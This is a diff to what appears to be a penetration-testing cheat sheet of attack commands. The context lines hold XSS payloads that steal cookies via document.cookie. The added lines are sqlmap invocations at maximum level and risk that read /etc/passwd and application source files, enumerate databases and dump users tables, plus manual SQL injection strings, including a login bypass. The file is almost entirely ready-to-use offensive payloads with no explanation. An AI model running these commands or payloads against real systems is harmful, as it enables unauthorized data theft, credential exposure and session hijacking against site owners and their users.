@@ -511,15 +511,27 @@ javascript:alert(document.cookie)
 <iframe src="https://$TARGET/?search=%22%3E%3Cbody%20onresize%3Dalert%28document%2Ecookie%29%3E" onload=this.style.width='0px'>
 
 [*] SQLi
-sqlmap -r request --batch --level 3 -dbs
-sqlmap -r request --batch --level 3 -D temp_db --tables
-sqlmap -r request --batch --level 3 -D temp_db -T users --columns
-sqlmap -r request --batch --level 3 -D temp_db -T users --columns --dump
+-->> Read Files
+sqlmap -r request --technique BESU --batch --answers="redirect=N" --ignore-redirects --level 5 --risk 3 --privileges
+sqlmap -r request --technique BESU --batch --answers="redirect=N" --ignore-redirects --level 5 --risk 3 --file-read=/etc/passwd
+/etc/apache2/sites-enabled/000-default.conf
+/var/www/$DOM/index.php
+/var/www/$DOM/app.py
+/var/www/$DOM/__init__.py
+/var/www/$DOM/main.py
+
+-->> Enumerate Database
+sqlmap -r request --technique BESU --batch --answers="redirect=N" --ignore-redirects --level 5 --risk 3 --dbs
+sqlmap -r request --technique BESU --batch --answers="redirect=N" --ignore-redirects --level 5 --risk 3 -D dbname --tables
+sqlmap -r request --technique BESU --batch --answers="redirect=N" --ignore-redirects --level 5 --risk 3 -D dbname -T users --columns --dump
+
+-->> Manual Injections
 '
 ' OR 1=1 -- #
 OR 1=1 -- #
 AND 1=1 -- #
 ' AND 1=1 -- #
+admin' and 1=1 -- -#
 administrator'-- #
 ' ORDER BY 1 -- #
 ' UNION SELECT table_name,NULL FROM information_schema.tables -- #
